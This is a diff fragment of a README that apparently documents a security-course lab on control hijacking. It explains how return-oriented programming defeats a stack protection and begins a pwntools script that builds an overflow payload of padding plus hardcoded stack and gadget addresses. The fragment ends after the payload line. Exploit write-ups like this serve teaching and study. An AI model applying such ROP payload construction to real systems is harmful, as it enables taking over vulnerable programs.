@@ -30,6 +30,7 @@ To overcome this type of protection, I used <b>Return-oriented programming</b>. 
 <img src="https://github.com/amir-sabzi/Network_Systems_Security/blob/master/Control_hijacking/stack.png" alt="drawing" width="500" align="center"/>
 </p>
 To perform discribed actions we should run a simple python code to write input in hex format in a file and then run the code with the input has been read from file. you can see this simple python script down below.  
+
 ```
 from pwn import *
 payload = 16 * "a" + p64(0x7fffffffe468)+ p64(0x400683) + p64(0x601048) + p64(0x00000000004005e8)
